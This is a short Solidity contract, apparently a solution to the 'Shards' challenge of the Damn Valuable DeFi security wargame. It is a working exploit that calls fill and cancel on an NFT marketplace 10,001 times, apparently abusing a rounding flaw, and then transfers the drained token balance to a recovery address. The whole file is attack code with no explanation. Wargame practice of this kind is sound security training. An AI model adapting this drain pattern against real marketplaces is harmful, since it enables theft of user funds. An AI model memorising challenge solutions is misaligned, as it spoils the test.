// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ShardsNFTMarketplace, DamnValuableToken} from "../../src/shards/ShardsNFTMarketplace.sol";

contract AttackShards {
    function attack(address marketplace, uint64 offerId, address token, address recovery) external {
        for (uint256 i = 0; i < 10001; i++) {
            uint256 purchaseIndex = ShardsNFTMarketplace(marketplace).fill(offerId, 100);
            ShardsNFTMarketplace(marketplace).cancel(offerId, purchaseIndex);
        }
        DamnValuableToken(token).transfer(recovery, DamnValuableToken(token).balanceOf(address(this)));
    }
}
